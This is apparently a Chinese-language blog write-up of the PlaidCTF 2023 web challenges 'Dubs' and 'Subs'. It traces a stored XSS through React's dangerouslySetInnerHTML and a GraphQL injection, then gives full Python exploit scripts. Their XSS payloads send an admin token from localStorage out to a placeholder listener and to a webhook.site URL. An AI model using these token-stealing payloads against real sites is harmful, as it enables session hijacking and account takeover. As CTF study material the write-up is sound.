---
title: PlaidCTF 2023 Writeup Web
date: 2023-04-19 08:54:28
categories:
- CTF
tags:
- xss
- React
toc: true
image:
  path: /assets/images/PlaidCTF_2023.png
---

## Davy Jones' Putlocker
>When I not be plunderin' the high seas, I be watchin' me favorite shows. Like any self-respectin' pirate, I don't be payin' for my media. But I'll be honest, this site even be a bit shady for me. (Note: PPP does not condone media piracy)


### Dubs
>Dubs·Reward:
>
>350·67 solves
>
>When running locally, you must launch with a publicly-accessible HOST environment variable, or else the admin bot won't work.
>
> [Archive Download](https://plaidctf.com/files/new-putlocker-dubs.310fe268c77d9f240661fd2679ce2ed29c50bc39d4c9f69d1fd9e92f429d0502.tar.gz)

拿到项目的源码之后,首先查看源码的目录结构。
```bash
└─$ tree -L 2                                          
.
├── docker-compose.yml
├── misc
│   └── init.sql
├── package.json
├── packages
│   ├── client
│   └── server
├── README.md
├── tsconfig.base.json
├── tsconfig.dom.json
├── tsconfig.node.json
├── turbo.json
└── yarn.lock
```
该目录是一个典型的 react monorepo 项目结构，分析源码和 docker-compose.yaml 可知这道题的架构如下所示：

```mermaid
flowchart LR
    subgraph "Docker Container"
        client[Client<br>React + Nginx<br>]
    end
    subgraph "Docker Container"
        server[Server<br>TypeScript +<br> GraphQL]
    end
    subgraph "Docker Container"
        postgres[Postgres<br>Database]
    end

    client -->|GraphQL <br> Request| server
    server -->|PSQL <br>Query| postgres

    class client,server,postgres component
    classDef component fill:#f9d3a3,stroke:#333,stroke-width:2px,font-size:14px;
```
client 使用 React 框架进行开发，编译之后放在 nginx 中，用于前端展示内容，server 是一个使用 TypeScript 编写的 graphql API 服务器，client 需要获取内容时，会向 server 发送 graphql 请求，server 接收到请求之后，查询 postgresql 数据库再进行响应。

访问 server 的 flag 接口可以获得 flag，但需要以 Admin 权限进行访问。
```js
flag: async (
    _: {},
    args: {},
    context: Context
) => {
    assertLoggedIn(context);
    await assertAdmin(context);

    return Flag;
}
```

server 中内置了一个 admin bot，使用 report 接口提交链接时，admin bot 会带上 token 对链接进行访问。

```js
export async function checkUrl(url: string) {
	if (!url.startsWith("http://") && !url.startsWith("https://")) {
		throw new Error("Invalid URL");
	}

	const browser = await puppeteer.launch({
		executablePath: "/usr/bin/chromium",
		headless: true,
		args: [
			"--no-sandbox",
			"--disable-setuid-sandbox",
			"--js-flags=--noexpose_wasm,--jitless",
		]
	});

	try {
		console.log("[checkUrl] Logging in...");
		const loginPage = await browser.newPage();
		await loginPage.goto(`http://${PUBLIC_HOST}:${PUBLIC_PORT}/login`);
		await loginPage.type("input[placeholder='Username']", "admin");
		await loginPage.type("input[placeholder='Password']", ADMIN_PASSWORD);
		await loginPage.click("input[type='submit']");
		await new Promise((resolve) => setTimeout(resolve, 2000));
		await loginPage.close();

		console.log("[checkUrl] Going to " + url + "...");
		const page = await browser.newPage();
		await page.goto(url);
		await new Promise((resolve) => setTimeout(resolve, 10000));
		await page.close();
	} catch (error) {
		console.error("[checkUrl] Error: ", error);
		throw new Error("Failed to check URL");
	} finally {
		console.log("[checkUrl] Tearing down...");
		await browser.close();
	}
}
```
到这里基本上可以判断需要构造 XSS 来获取 admin bot 的凭证信息。XSS 漏洞需要在 client 的源码中寻找。

client 使用的是 React 框架，查找 React XSS 的相关信息，基本上都集中在了一个方法的滥用上：**dangerouslySetInnerHTML**。

当前端开发者需要直接往该标签内写入 HTML 时，可以使用 `dangerouslySetInnerHTML{% raw %}{{__html: '<html content>'}}{% endraw %}` 这种形式插入。React 也希望开发者能够避免使用这种方式，所以将该函数命名为 dangerouslySetInnerHTML。

直接在项目中搜索 dangerouslySetInnerHTML，可以找到在 EpisodePanel.tsx、FeaturedPanel.tsx、InfoPanel.tsx、UserPlaylistsPanel.tsx 都使用了这个函数。
```
{% raw %}
dangerouslySetInnerHTML={{ __html: data.episode.description }}
dangerouslySetInnerHTML={{ __html: data.featuredShow.description }}
dangerouslySetInnerHTML={{ __html: data.show.description }}
dangerouslySetInnerHTML={{ __html: playlist.description }}
{% endraw %}
```
这几个数据都在 server 中进行了类型定义，可以看到 description 字段的内容都是字符串类型，featuredShow 是题目在初始化时以 admin 用户的身份插入到数据库里的，因此无法控制。
```js
const typeDefs = `
	type Show {
		id: ID!
		name: String!
		description: String!
		rawDescription: String!
		coverUrl: String!
		genres: [Genre!]!
		episodes: [Episode!]!
		owner: User!
	}

	type Episode {
		id: ID!
		name: String!
		url: String!
		createdAt: String!
		description: String!
		rawDescription: String!
		show: Show!
		rating: Float
		ratingCount: Int!
		previous: Episode
		next: Episode
	}

	type Playlist {
		id: ID!
		name: String!
		owner: User!
		description: String!
		episodes: [Episode!]!
		episodeCount: Int!
	}
    ...
```
由于 client 获取数据时是通过 graphql API 进行查询的，graphql 在返回数据时还进行了额外的处理，Show 和 Episode 数据的 description 字段都会进入 renderHtml 函数。

```js
Show: {
    description: (show: Show) => renderHtml(show.description),
    rawDescription: (show: Show) => show.description,
    genres: (show: Show) => loadShowGenres(show.id),
    episodes: (show: Show) => loadShowEpisodes(show.id),
    owner: (show: Show) => loadUser(show.owner)
},
Episode: {
    description: (episode: Episode) => renderHtml(episode.description),
    rawDescription: (episode: Episode) => episode.description,
    show: (episode: Episode) => loadShow(episode.show),
    previous: async (episode: Episode) => notFoundToNull(loadPreviousEpisode(episode.id)),
    next: async (episode: Episode) => notFoundToNull(loadNextEpisode(episode.id))
},
```

renderHtml 函数的内容如下，micromark 可以将 markdown 语法的内容转化为 html。
```js
export function renderHtml(content: string): string {
	return micromark(content);
}
```
如果 micromark 的渲染存在漏洞，没准也是可以达成 XSS 的，但毕竟是一个最新版本的开源库，难度还是很大的。

看到这里其实可以发现，Playlist 的 description 字段其实是没有经过 renderHtml 处理的，可以直接验证一下是否存在 XSS。

1. 首先注册一个用户并登陆。
2. create playlist 创建 playlist，在 description 中填入 XSS payload：`<img src=x onerror=alert(/xxxx/);>`
3. 提交之后回到主页面，点击左上方的用户名就可以查看所有的 playlist。
4. 成功触发 XSS
   ![20230418043722](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20230418043722.png)
   
所以 exp 就很明确了：
1. 创建带有 XSS payload playlist
2. 将触发的链接填入 /report
3. admin bot 访问之后触发 XSS，将 token 发送到远程服务器
4. 获取到 token 之后访问 flag 接口即可得到 flag。

exp.py
```py
import requests
import json

host = "http://5c3eea90-99b7-473b-a43f-d285092cd5a9.dubs.putlocker.chal.pwni.ng:20007"
username = "dummykitty"
password = "dummykitty"

sess = requests.session()

proxies = {
    "http":"http://127.0.0.1:8080",
    "https":"http://127.0.0.1:8080"
}

def register():
    data = {
        "operationName":"Register",
        "variables":{},
        "query":"mutation Register {\n  register(name: \""+ username +"\", password: \"" + password +"\")\n}"
    }

    res = sess.post(f"{host}/graphql",json=data,proxies=proxies,verify=False)
    if res.status_code == 200:
        print(f"[+] register success")
        return 
    
def login():
    data = {
        "operationName":"Login",
        "variables":{},
        "query":"mutation Login {\n  login(name: \"" + username + "\", password: \"" + password +"\")\n}"
    }
    res = sess.post(f"{host}/graphql",json=data,proxies=proxies,verify=False)
    if res.status_code == 200:
        print(f"[+] login success")
        token = json.loads(res.text)["data"]["login"]
        print(f"[+] get token: {token}")
        sess.headers.update({'authorization': token})

def create_playlist():
    payload = "<img src=x onerror=fetch(\\\"http://xxxxxxx:9999/cookie.php?c=\\\"+localStorage.getItem(\\\"token\\\"));>"

    data = {
        "operationName":"CreatePlaylist",
        "variables":{},
        "query":"mutation CreatePlaylist {\n  createPlaylist(\n    name: \"testPayload\"\n    description: \"" + payload + "\"\n  ) {\n    id\n    __typename\n  }\n}"
    }

    res = sess.post(f"{host}/graphql",json=data,proxies=proxies,verify=False)
    if res.status_code == 200:
        print(f"[+] send payload {payload}")

def get_selfid():
    data = {"operationName":"SelfQuery","variables":{},"query":"query SelfQuery {\n  self {\n    id\n    name\n    __typename\n  }\n}"}
    res = sess.post(f"{host}/graphql",json=data,proxies=proxies,verify=False)
    if res.status_code == 200:
        id = json.loads(res.text)["data"]["self"]["id"]

        print(f"[+] self id :{id}")
    return id

def report(id):
    payload = f"{host}/user/{id}"
    data = {
        "operationName":"Report",
        "variables":{},
        "query":"mutation Report {\n  report(url: \"" + payload + "\")\n}"
    }

    res = sess.post(f"{host}/graphql",json=data,proxies=proxies,verify=False) 
    if res.status_code == 200:
        print("[+] report done")

def main():
    register()
    login()
    id = get_selfid()
    create_playlist()
    report(id)

def get_flag(token):
    sess.headers.update({'authorization': token})
    data = {"query": "mutation { flag }"}
    res = sess.post(f"{host}/graphql",json=data,proxies=proxies,verify=False) 
    if res.status_code == 200:
        flag = json.loads(res.text)["data"]["flag"]
        print(f"[+] flag: {flag}")

if __name__ == "__main__":
    # main()
    get_flag("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2ODE2NDAzNDAsInN1YiI6ImYwOTcwMmE1LTViYTItNDU4MC04ZTc1LTQ4M2EwNmNhMWY2MiIsImlhdCI6MTY4MTYzNjc0MH0.yO1_E_-lMYzf1YZAR3mSKu18PAoMcznDGe_ZqG-1YXo")
```

### Subs
大佬的 exp，还需要进一步研究。。
solve.py
```py
import requests
import json
import os
from urllib.parse import quote

## host = "http://localhost:7008"
host = "http://c3365128-2e0e-4a33-bcd3-f7ffc8f33790.subs.putlocker.chal.pwni.ng:20002"
payload = (
    "<img src=x: onerror='location=`https://webhook.site/ed852d2a-b167-49da-9159-d48909b980bd?token=`+encodeURIComponent(localStorage.token)'>"
    + os.urandom(8).hex()
)


def graphql(query, variables={}, token=""):
    r = requests.post(
        host + "/graphql",
        json={"query": query, "variables": variables},
        headers={
            "Authorization": token,
        },
    )
    return r.json()


random_episode_id = graphql(
    """
query {
    recentEpisodes {
        id
    }
}
"""
)["data"]["recentEpisodes"][0]["id"]

token = graphql(
    """
mutation($payload: String!) {
    register(name: $payload, password: $payload)
}
""",
    {"payload": payload},
)["data"]["register"]
playlist_id = graphql(
    """
mutation($name: String!, $description: String!) {
    createPlaylist(name: $name, description: $description) {
        id
    }
}
""",
    {"name": "peko", "description": "miko"},
    token=token,
)["data"]["createPlaylist"]["id"]
print(
    graphql(
        """
mutation($playlist_id: ID!, $episode_id: ID!) {
    updatePlaylistEpisodes(id: $playlist_id, episodes: [$episode_id]) {
        id
    }
}
""",
        {"playlist_id": playlist_id, "episode_id": random_episode_id},
        token=token,
    )
)
print(payload)

## location='/playlist/peko?id[kind]=Name&id[value]='+encodeURIComponent(`"b4429f09-0f36-4e67-aa94-492a4d00b885") {
##         id
##         name
##         description: rawDescription
##         episodes {
##             id
##             name
##         }
##         owner {
##             id
##             name
##         }
##     }
##     pl2: playlist(id: "1b6ca857-9560-4f9b-93fd-e12f5f68dd0c") {
##         id
##         name
##         description: owner {
##           __html: name
##         }
##         url: name
##         rating: name
##         ratingCount: name
##         show: owner {
##             owner: shows {
##                 id
##             }
##         }
##     }
##     pl2: episode(id:"5aac1f62-6a23-4054-bd73-60d48396a13d") @client
##     dummy: playlist(id: "00000000-0000-0000-0000-000000000000"`)

url = (
    host
    + "/playlist/peko?id[kind]=Name&id[value]="
    + quote(
        """"%s") { 
        id
        name
        description: rawDescription
        episodes {
            id
            name
        }
        owner {
            id
            name
        }
    }
    pl2: playlist(id: "%s") {
        id
        name
        description: owner {
          __html: name
        }
        url: name
        rating: name
        ratingCount: name
        show: owner {
            owner: shows {
                id
            }
        }
    }
    pl2: episode(id:"%s") @client
    dummy: playlist(id: "00000000-0000-0000-0000-000000000000"
"""
        % (playlist_id, playlist_id, random_episode_id)
    )
)
## apollo client quriks caused this:
## cache.data.data.ROOT_QUERY['episode({"id":"..."})'] = {"id": "...", "name": "...", "description": {"__html": "..."}, ...}
print(url)

print(
    graphql(
        """
mutation($url: String!) {
    report(url: $url)
}
""",
        {"url": url},
        token=token,
    )
)

## grab admin token and `mutation { flag }`
## PCTF{say_what_you_will_about_these_sites_but_they_wont_pull_a_warner_bros_discovery_on_you_and_yeet_37_shows_into_the_void_f0e0079af5e5b05edbf5d248}

```


## 参考
- [PlaidCTF 2023 WriteUps ](https://blog.maple3142.net/2023/04/17/plaidctf-2023-writeups/)
- [KeenLab Tech Talk（二）- 浅谈React框架的XSS及后利用](https://www.freebuf.com/vuls/304954.html)